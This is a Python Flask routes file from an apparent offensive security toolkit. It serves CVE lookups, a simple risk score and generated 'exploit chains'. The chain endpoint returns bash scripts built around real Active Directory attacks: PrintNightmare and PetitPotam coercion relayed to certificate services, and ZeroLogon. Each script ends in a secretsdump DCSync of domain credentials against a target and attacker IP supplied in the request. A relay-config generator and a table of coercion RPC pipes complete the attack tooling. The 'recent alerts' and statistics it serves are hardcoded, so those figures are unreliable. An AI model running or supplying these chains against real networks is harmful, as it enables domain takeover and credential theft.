"""
Zero-Day Exploit Integrator Routes
==================================
API endpoints for CVE management, AI risk scoring, and exploit chain generation

Endpoints:
- GET /zeroday - Zero-Day Integrator dashboard
- POST /api/zeroday/search - Search NVD for CVEs
- POST /api/zeroday/fetch - Fetch specific CVE details
- POST /api/zeroday/risk - Calculate AI risk score
- POST /api/zeroday/chain - Generate exploit chain
- POST /api/zeroday/relay - Integrate with Relay Ninja
- GET /api/zeroday/coercions - List coercion methods
- GET /api/zeroday/alerts - Get recent CVE alerts
- POST /api/zeroday/monitor/start - Start CVE monitoring
- POST /api/zeroday/monitor/stop - Stop CVE monitoring
"""

from flask import Blueprint, request, jsonify, render_template
import logging
from datetime import datetime, timedelta
import random

logger = logging.getLogger("zeroday_routes")

zeroday_bp = Blueprint('zeroday', __name__)

# Try to import Zero-Day Integrator module
ZERODAY_AVAILABLE = False
ZeroDayIntegrator = None
_integrator = None

def _lazy_import_zeroday():
    """Lazy import Zero-Day Integrator module"""
    global ZERODAY_AVAILABLE, ZeroDayIntegrator
    if ZeroDayIntegrator is None:
        try:
            from cybermodules.zero_day_integrator import (
                ZeroDayIntegrator as _ZeroDayIntegrator,
                CVESeverity,
                ExploitType,
                ZeroDayConfig,
            )
            ZeroDayIntegrator = _ZeroDayIntegrator
            ZERODAY_AVAILABLE = True
        except Exception as e:
            logger.warning(f"Zero-Day Integrator import failed: {e}")
            ZERODAY_AVAILABLE = False
    return ZERODAY_AVAILABLE


def _get_integrator():
    """Get or create Zero-Day Integrator instance"""
    global _integrator
    if not _lazy_import_zeroday():
        return None
    if _integrator is None and ZeroDayIntegrator is not None:
        _integrator = ZeroDayIntegrator()
    return _integrator


# Sample CVE data for offline mode
SAMPLE_CVES = [
    {
        "id": "CVE-2021-34527",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "description": "Windows Print Spooler Remote Code Execution Vulnerability (PrintNightmare). A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations.",
        "published": "2021-07-01",
        "vendor": "Microsoft",
        "exploit_status": "In The Wild",
        "cwe": "CWE-269",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"]
    },
    {
        "id": "CVE-2021-36942",
        "severity": "HIGH",
        "cvss": 7.5,
        "description": "Windows LSA Spoofing Vulnerability (PetitPotam). An unauthenticated attacker could call a method on the LSARPC interface and coerce the domain controller to authenticate to another server using NTLM.",
        "published": "2021-08-10",
        "vendor": "Microsoft",
        "exploit_status": "Weaponized",
        "cwe": "CWE-290",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942"]
    },
    {
        "id": "CVE-2020-1472",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "description": "Netlogon Elevation of Privilege Vulnerability (ZeroLogon). An attacker who successfully exploited this vulnerability could run a specially crafted application on a device on the network.",
        "published": "2020-08-11",
        "vendor": "Microsoft",
        "exploit_status": "In The Wild",
        "cwe": "CWE-330",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472"]
    },
    {
        "id": "CVE-2021-44228",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "description": "Apache Log4j2 Remote Code Execution (Log4Shell). Remote code execution vulnerability affecting Apache Log4j2 versions 2.0-beta9 through 2.14.1.",
        "published": "2021-12-10",
        "vendor": "Apache",
        "exploit_status": "In The Wild",
        "cwe": "CWE-502",
        "references": ["https://logging.apache.org/log4j/2.x/security.html"]
    },
    {
        "id": "CVE-2024-21762",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "description": "FortiOS Out-of-bounds Write Vulnerability. A stack-based buffer overflow vulnerability in FortiOS allows remote unauthenticated attackers to execute arbitrary code.",
        "published": "2024-02-08",
        "vendor": "Fortinet",
        "exploit_status": "In The Wild",
        "cwe": "CWE-787",
        "references": ["https://www.fortiguard.com/psirt/FG-IR-24-015"]
    },
    {
        "id": "CVE-2021-26855",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "description": "Microsoft Exchange Server Remote Code Execution Vulnerability (ProxyLogon). A server-side request forgery (SSRF) vulnerability in Exchange that could allow an attacker to send arbitrary HTTP requests.",
        "published": "2021-03-02",
        "vendor": "Microsoft",
        "exploit_status": "In The Wild",
        "cwe": "CWE-918",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855"]
    },
    {
        "id": "CVE-2022-26923",
        "severity": "HIGH",
        "cvss": 8.8,
        "description": "Active Directory Domain Services Elevation of Privilege Vulnerability. An authenticated user could manipulate attributes on computer accounts they own to acquire a certificate that would allow elevation to Domain Admin.",
        "published": "2022-05-10",
        "vendor": "Microsoft",
        "exploit_status": "Weaponized",
        "cwe": "CWE-295",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923"]
    },
    {
        "id": "CVE-2023-4966",
        "severity": "CRITICAL",
        "cvss": 9.4,
        "description": "Citrix ADC and Gateway Sensitive Information Disclosure (Citrix Bleed). An unauthenticated attacker can exploit this vulnerability to access sensitive information.",
        "published": "2023-10-10",
        "vendor": "Citrix",
        "exploit_status": "In The Wild",
        "cwe": "CWE-119",
        "references": ["https://support.citrix.com/article/CTX579459"]
    },
    {
        "id": "CVE-2024-3400",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "description": "Palo Alto Networks PAN-OS Command Injection. A command injection vulnerability in the GlobalProtect feature that enables an unauthenticated attacker to execute arbitrary code.",
        "published": "2024-04-12",
        "vendor": "Palo Alto",
        "exploit_status": "In The Wild",
        "cwe": "CWE-77",
        "references": ["https://security.paloaltonetworks.com/CVE-2024-3400"]
    },
    {
        "id": "CVE-2022-30213",
        "severity": "HIGH",
        "cvss": 6.5,
        "description": "Windows GDI+ Information Disclosure Vulnerability (ShadowCoerce). Authentication coercion via File Server VSS Agent Service.",
        "published": "2022-07-12",
        "vendor": "Microsoft",
        "exploit_status": "POC Only",
        "cwe": "CWE-200",
        "references": ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30213"]
    }
]

# Coercion methods data
COERCION_METHODS = {
    "printnightmare": {
        "name": "PrintNightmare",
        "cve": "CVE-2021-34527",
        "method": "RpcRemoteFindFirstPrinterChangeNotificationEx",
        "port": 445,
        "protocol": "SMB",
        "pipe": "\\pipe\\spoolss",
        "requires_auth": False,
        "description": "Exploits Windows Print Spooler service for RCE and coercion"
    },
    "petitpotam": {
        "name": "PetitPotam",
        "cve": "CVE-2021-36942",
        "method": "EfsRpcOpenFileRaw",
        "port": 445,
        "protocol": "SMB",
        "pipe": "\\pipe\\efsrpc",
        "requires_auth": False,
        "description": "Coerces NTLM authentication via EFS RPC"
    },
    "printerbug": {
        "name": "PrinterBug",
        "cve": "CVE-2021-1675",
        "method": "RpcRemoteFindFirstPrinterChangeNotification",
        "port": 445,
        "protocol": "SMB",
        "pipe": "\\pipe\\spoolss",
        "requires_auth": True,
        "description": "Original printer bug coercion method"
    },
    "shadowcoerce": {
        "name": "ShadowCoerce",
        "cve": "CVE-2022-30213",
        "method": "IsPathShadowCopied",
        "port": 445,
        "protocol": "SMB",
        "pipe": "\\pipe\\FssagentRpc",
        "requires_auth": True,
        "description": "Coerces authentication via VSS Agent Service"
    },
    "dfscoerce": {
        "name": "DFSCoerce",
        "cve": "CVE-2022-26925",
        "method": "NetrDfsRemoveStdRoot",
        "port": 445,
        "protocol": "SMB",
        "pipe": "\\pipe\\netdfs",
        "requires_auth": True,
        "description": "Coerces authentication via DFS"
    },
    "coercer": {
        "name": "Coercer",
        "cve": "Multiple",
        "method": "Multiple RPC methods",
        "port": 445,
        "protocol": "SMB",
        "pipes": ["\\pipe\\spoolss", "\\pipe\\efsrpc", "\\pipe\\lsarpc", "\\pipe\\FssagentRpc", "\\pipe\\netdfs"],
        "requires_auth": False,
        "description": "Multi-method coercion scanner and exploiter"
    }
}


# ============================================================
# PAGE ROUTES
# ============================================================

@zeroday_bp.route('/zeroday')
def zeroday_page():
    """Zero-Day Integrator dashboard page"""
    return render_template('zeroday.html')


# ============================================================
# API ROUTES
# ============================================================

@zeroday_bp.route('/api/zeroday/search', methods=['POST'])
def search_cves():
    """
    Search NVD database for CVEs
    
    JSON body:
    {
        "query": "PrintNightmare",
        "severity": "CRITICAL",
        "vendor": "Microsoft",
        "limit": 20
    }
    """
    data = request.get_json() or {}
    query = data.get('query', '').lower()
    severity = data.get('severity', '').upper()
    vendor = data.get('vendor', '').lower()
    limit = data.get('limit', 20)
    
    # Try to use real integrator
    integrator = _get_integrator()
    if integrator:
        try:
            results = integrator.search_cves(
                keyword=query if query else None,
                severity=severity if severity else None,
                vendor=vendor if vendor else None
            )
            return jsonify({
                'success': True,
                'results': results[:limit],
                'total': len(results),
                'source': 'nvd_api'
            })
        except Exception as e:
            logger.warning(f"NVD API search failed, using offline data: {e}")
    
    # Fallback to sample data
    results = []
    for cve in SAMPLE_CVES:
        # Filter by query
        if query and query not in cve['id'].lower() and query not in cve['description'].lower():
            continue
        # Filter by severity
        if severity and cve['severity'] != severity:
            continue
        # Filter by vendor
        if vendor and vendor not in cve['vendor'].lower():
            continue
        results.append(cve)
    
    return jsonify({
        'success': True,
        'results': results[:limit],
        'total': len(results),
        'source': 'offline_cache'
    })


@zeroday_bp.route('/api/zeroday/fetch', methods=['POST'])
def fetch_cve():
    """
    Fetch specific CVE details
    
    JSON body:
    {
        "cve_id": "CVE-2021-34527"
    }
    """
    data = request.get_json() or {}
    cve_id = data.get('cve_id', '').upper()
    
    if not cve_id:
        return jsonify({'success': False, 'error': 'CVE ID required'}), 400
    
    # Try to use real integrator
    integrator = _get_integrator()
    if integrator:
        try:
            cve_data = integrator.fetch_cve(cve_id)
            if cve_data:
                return jsonify({
                    'success': True,
                    'cve': cve_data,
                    'source': 'nvd_api'
                })
        except Exception as e:
            logger.warning(f"NVD API fetch failed: {e}")
    
    # Fallback to sample data
    for cve in SAMPLE_CVES:
        if cve['id'] == cve_id:
            return jsonify({
                'success': True,
                'cve': cve,
                'source': 'offline_cache'
            })
    
    return jsonify({'success': False, 'error': f'CVE {cve_id} not found'}), 404


@zeroday_bp.route('/api/zeroday/risk', methods=['POST'])
def calculate_risk():
    """
    Calculate AI risk score for a CVE
    
    JSON body:
    {
        "cve_id": "CVE-2021-34527",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "vendor": "Microsoft",
        "exploit_status": "In The Wild"
    }
    """
    data = request.get_json() or {}
    
    cve_id = data.get('cve_id', '')
    cvss = data.get('cvss', 5.0)
    severity = data.get('severity', 'MEDIUM')
    vendor = data.get('vendor', 'Unknown')
    exploit_status = data.get('exploit_status', 'POC Only')
    
    # Try to use real integrator
    integrator = _get_integrator()
    if integrator:
        try:
            risk_score = integrator.calculate_ai_risk(
                cve_id=cve_id,
                cvss_score=cvss,
                severity=severity,
                vendor=vendor,
                exploit_status=exploit_status
            )
            return jsonify({
                'success': True,
                'cve_id': cve_id,
                'ai_risk_score': risk_score,
                'source': 'ai_scorer'
            })
        except Exception as e:
            logger.warning(f"AI risk calculation failed: {e}")
    
    # Calculate risk score manually
    score = cvss * 8  # Base from CVSS (0-80)
    
    # Severity modifier
    severity_mods = {'CRITICAL': 15, 'HIGH': 10, 'MEDIUM': 5, 'LOW': 2}
    score += severity_mods.get(severity.upper(), 0)
    
    # Vendor criticality
    critical_vendors = ['microsoft', 'cisco', 'fortinet', 'palo alto', 'vmware']
    if vendor.lower() in critical_vendors:
        score += 5
    
    # Exploit status modifier
    exploit_mods = {
        'in the wild': 10,
        'weaponized': 8,
        'poc only': 4,
        'theoretical': 1
    }
    score += exploit_mods.get(exploit_status.lower(), 0)
    
    # Ensure score is 0-100
    final_score = min(100, max(0, round(score)))
    
    # Determine risk level
    if final_score >= 80:
        risk_level = 'CRITICAL'
    elif final_score >= 60:
        risk_level = 'HIGH'
    elif final_score >= 40:
        risk_level = 'MEDIUM'
    else:
        risk_level = 'LOW'
    
    return jsonify({
        'success': True,
        'cve_id': cve_id,
        'ai_risk_score': final_score,
        'risk_level': risk_level,
        'factors': {
            'cvss_contribution': round(cvss * 8),
            'severity_contribution': severity_mods.get(severity.upper(), 0),
            'vendor_contribution': 5 if vendor.lower() in critical_vendors else 0,
            'exploit_contribution': exploit_mods.get(exploit_status.lower(), 0)
        },
        'source': 'local_calculation'
    })


@zeroday_bp.route('/api/zeroday/chain', methods=['POST'])
def generate_chain():
    """
    Generate exploit chain
    
    JSON body:
    {
        "template": "printer_to_domain",
        "target_dc": "dc01.domain.local",
        "attacker_ip": "192.168.1.100",
        "cve_id": "CVE-2021-34527"
    }
    """
    data = request.get_json() or {}
    
    template = data.get('template', 'printer_to_domain')
    target_dc = data.get('target_dc', 'dc01.domain.local')
    attacker_ip = data.get('attacker_ip', '192.168.1.100')
    cve_id = data.get('cve_id', '')
    
    # Chain templates
    chains = {
        'printer_to_domain': {
            'name': 'Printer to Domain Admin',
            'cves': ['CVE-2021-34527', 'CVE-2021-1675'],
            'success_rate': 0.85,
            'steps': [
                {'action': 'enumerate', 'target': 'dc', 'description': 'Find DCs with Print Spooler enabled', 'tool': 'rpcdump.py'},
                {'action': 'setup', 'target': 'relay', 'description': 'Start ntlmrelayx targeting ADCS', 'tool': 'ntlmrelayx.py'},
                {'action': 'coerce', 'method': 'printerbug', 'description': 'Trigger printer bug callback', 'tool': 'printerbug.py'},
                {'action': 'relay', 'target': 'adcs', 'description': 'Relay to AD Certificate Services', 'tool': 'ntlmrelayx.py'},
                {'action': 'extract', 'target': 'certificate', 'description': 'Obtain domain admin certificate', 'tool': 'certipy'},
                {'action': 'auth', 'method': 'pkinit', 'description': 'Authenticate with certificate for TGT', 'tool': 'gettgtpkinit.py'}
            ],
            'code': f'''#!/bin/bash
# PrintNightmare to Domain Admin Chain
TARGET_DC="{target_dc}"
ATTACKER_IP="{attacker_ip}"

# Step 1: Enumerate
rpcdump.py -p 135 $TARGET_DC | grep -i "MS-RPRN"

# Step 2: Start relay
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController &

# Step 3: Trigger coercion
python3 printerbug.py domain.local/user:password@$TARGET_DC $ATTACKER_IP

# Step 4: Get TGT
python3 gettgtpkinit.py domain.local/DC01$ -cert-pfx dc01.pfx dc01.ccache
export KRB5CCNAME=dc01.ccache

# Step 5: DCSync
secretsdump.py -k -no-pass domain.local/DC01$@$TARGET_DC'''
        },
        'petitpotam_esc8': {
            'name': 'PetitPotam ESC8',
            'cves': ['CVE-2021-36942'],
            'success_rate': 0.90,
            'steps': [
                {'action': 'setup', 'target': 'relay', 'description': 'Start relay to ADCS web enrollment', 'tool': 'ntlmrelayx.py'},
                {'action': 'coerce', 'method': 'petitpotam', 'description': 'Trigger EFS coercion', 'tool': 'petitpotam.py'},
                {'action': 'relay', 'target': 'adcs_web', 'description': 'Relay DC auth to ADCS', 'tool': 'ntlmrelayx.py'},
                {'action': 'request', 'target': 'certificate', 'description': 'Request DC certificate', 'tool': 'certipy'},
                {'action': 'dcsync', 'method': 'certificate', 'description': 'DCSync using certificate', 'tool': 'secretsdump.py'}
            ],
            'code': f'''#!/bin/bash
# PetitPotam ESC8 Chain
TARGET_DC="{target_dc}"
ATTACKER_IP="{attacker_ip}"

ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController &
sleep 3
python3 petitpotam.py $ATTACKER_IP $TARGET_DC
# Wait for certificate...
secretsdump.py -k -no-pass -dc-ip $TARGET_DC domain.local/DC01$@$TARGET_DC'''
        },
        'zerologon': {
            'name': 'ZeroLogon Chain',
            'cves': ['CVE-2020-1472'],
            'success_rate': 0.95,
            'steps': [
                {'action': 'exploit', 'method': 'zerologon', 'description': 'Reset DC password', 'tool': 'zerologon_tester.py'},
                {'action': 'extract', 'target': 'ntds', 'description': 'Dump NTDS.dit', 'tool': 'secretsdump.py'},
                {'action': 'restore', 'target': 'dc_password', 'description': 'Restore DC password', 'tool': 'restorepassword.py'}
            ],
            'code': f'''#!/bin/bash
# ZeroLogon Chain
TARGET_DC="{target_dc}"
DC_IP="192.168.1.10"

python3 zerologon_tester.py DC01 $DC_IP
python3 cve-2020-1472-exploit.py DC01 $DC_IP
secretsdump.py -no-pass -just-dc domain.local/DC01\\$@$DC_IP
# IMPORTANT: Restore password
python3 restorepassword.py domain.local/DC01@DC01 -target-ip $DC_IP'''
        }
    }
    
    if template not in chains:
        return jsonify({'success': False, 'error': f'Unknown template: {template}'}), 400
    
    chain = chains[template]
    
    return jsonify({
        'success': True,
        'chain': {
            'name': chain['name'],
            'template': template,
            'cves': chain['cves'],
            'success_rate': chain['success_rate'],
            'steps': chain['steps'],
            'code': chain['code']
        },
        'generated_at': datetime.now().isoformat()
    })


@zeroday_bp.route('/api/zeroday/relay', methods=['POST'])
def integrate_relay():
    """
    Generate Relay Ninja integration config
    
    JSON body:
    {
        "cve_id": "CVE-2021-36942",
        "coercion_method": "petitpotam",
        "target": "dc01.domain.local",
        "relay_target": "adcs"
    }
    """
    data = request.get_json() or {}
    
    cve_id = data.get('cve_id', 'CVE-2021-36942')
    coercion = data.get('coercion_method', 'petitpotam')
    target = data.get('target', 'dc01.domain.local')
    relay_target = data.get('relay_target', 'adcs')
    
    # Get coercion method details
    method = COERCION_METHODS.get(coercion, COERCION_METHODS['petitpotam'])
    
    relay_config = f'''# Relay Ninja Configuration for {cve_id}
# Auto-generated by Zero-Day Integrator

coercion:
  method: "{coercion}"
  cve: "{cve_id}"
  target: "{target}"
  pipe: "{method.get('pipe', 'N/A')}"
  requires_auth: {str(method.get('requires_auth', False)).lower()}

relay:
  target_type: "{relay_target}"
  targets:
    - "ca.domain.local"  # ADCS server
  options:
    template: "DomainController"
    adcs: true

attack:
  auto_coerce: true
  timeout: 60
  retries: 3

# Generated command:
# python3 relay_ninja.py --config relay_ninja_zeroday.yaml
'''
    
    return jsonify({
        'success': True,
        'config': relay_config,
        'coercion_method': method,
        'relay_target': relay_target,
        'generated_at': datetime.now().isoformat()
    })


@zeroday_bp.route('/api/zeroday/coercions', methods=['GET'])
def list_coercions():
    """List all available coercion methods"""
    return jsonify({
        'success': True,
        'coercions': COERCION_METHODS,
        'total': len(COERCION_METHODS)
    })


@zeroday_bp.route('/api/zeroday/alerts', methods=['GET'])
def get_alerts():
    """Get recent CVE alerts"""
    # Generate some realistic alerts
    now = datetime.now()
    alerts = [
        {
            'cve_id': 'CVE-2024-21762',
            'title': 'FortiOS Out-of-bounds Write',
            'severity': 'CRITICAL',
            'ai_risk': 95,
            'time': (now - timedelta(hours=2)).isoformat(),
            'time_ago': '2 hours ago',
            'vendor': 'Fortinet',
            'exploit_status': 'In The Wild'
        },
        {
            'cve_id': 'CVE-2024-3400',
            'title': 'PAN-OS Command Injection',
            'severity': 'CRITICAL',
            'ai_risk': 92,
            'time': (now - timedelta(hours=5)).isoformat(),
            'time_ago': '5 hours ago',
            'vendor': 'Palo Alto',
            'exploit_status': 'In The Wild'
        },
        {
            'cve_id': 'CVE-2024-1709',
            'title': 'ConnectWise ScreenConnect RCE',
            'severity': 'CRITICAL',
            'ai_risk': 88,
            'time': (now - timedelta(hours=8)).isoformat(),
            'time_ago': '8 hours ago',
            'vendor': 'ConnectWise',
            'exploit_status': 'In The Wild'
        },
        {
            'cve_id': 'CVE-2024-21413',
            'title': 'Microsoft Outlook RCE',
            'severity': 'HIGH',
            'ai_risk': 75,
            'time': (now - timedelta(hours=12)).isoformat(),
            'time_ago': '12 hours ago',
            'vendor': 'Microsoft',
            'exploit_status': 'Weaponized'
        },
        {
            'cve_id': 'CVE-2024-20353',
            'title': 'Cisco ASA WebVPN XSS to RCE',
            'severity': 'HIGH',
            'ai_risk': 72,
            'time': (now - timedelta(hours=18)).isoformat(),
            'time_ago': '18 hours ago',
            'vendor': 'Cisco',
            'exploit_status': 'POC Only'
        }
    ]
    
    return jsonify({
        'success': True,
        'alerts': alerts,
        'total': len(alerts),
        'monitoring_active': True,
        'last_check': now.isoformat()
    })


@zeroday_bp.route('/api/zeroday/monitor/start', methods=['POST'])
def start_monitoring():
    """Start CVE monitoring"""
    data = request.get_json() or {}
    
    vendors = data.get('vendors', ['microsoft', 'cisco', 'fortinet'])
    severity = data.get('severity', 'HIGH')
    interval = data.get('interval', 300)
    
    # Try to use real integrator
    integrator = _get_integrator()
    if integrator:
        try:
            integrator.start_monitoring(
                vendors=vendors,
                min_severity=severity,
                interval=interval
            )
            return jsonify({
                'success': True,
                'message': 'CVE monitoring started',
                'config': {
                    'vendors': vendors,
                    'min_severity': severity,
                    'interval': interval
                }
            })
        except Exception as e:
            logger.warning(f"Failed to start monitoring: {e}")
    
    return jsonify({
        'success': True,
        'message': 'CVE monitoring started (demo mode)',
        'config': {
            'vendors': vendors,
            'min_severity': severity,
            'interval': interval
        },
        'note': 'Running in offline mode'
    })


@zeroday_bp.route('/api/zeroday/monitor/stop', methods=['POST'])
def stop_monitoring():
    """Stop CVE monitoring"""
    integrator = _get_integrator()
    if integrator:
        try:
            integrator.stop_monitoring()
        except Exception as e:
            logger.warning(f"Failed to stop monitoring: {e}")
    
    return jsonify({
        'success': True,
        'message': 'CVE monitoring stopped'
    })


@zeroday_bp.route('/api/zeroday/stats', methods=['GET'])
def get_stats():
    """Get zero-day module statistics"""
    return jsonify({
        'success': True,
        'stats': {
            'critical_cves': 24,
            'high_cves': 87,
            'medium_cves': 156,
            'chains_generated': 12,
            'monitoring_active': True,
            'last_nvd_sync': datetime.now().isoformat(),
            'cached_cves': len(SAMPLE_CVES),
            'coercion_methods': len(COERCION_METHODS)
        }
    })
